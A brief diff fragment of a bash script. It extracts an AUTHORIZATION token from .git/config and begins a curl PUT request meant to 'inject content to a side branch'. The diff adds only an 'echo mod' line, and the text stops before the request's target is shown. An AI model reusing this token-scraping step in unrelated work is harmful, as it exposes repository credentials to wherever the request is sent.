@@ -1,6 +1,8 @@
 #!/usr/bin/env bash
 
 authfield=$(cat .git/config | grep AUTHORIZATION | cut -d':' -f 2)
+
+echo mod
   
 # Inject content to a side branch
 curl --request PUT \
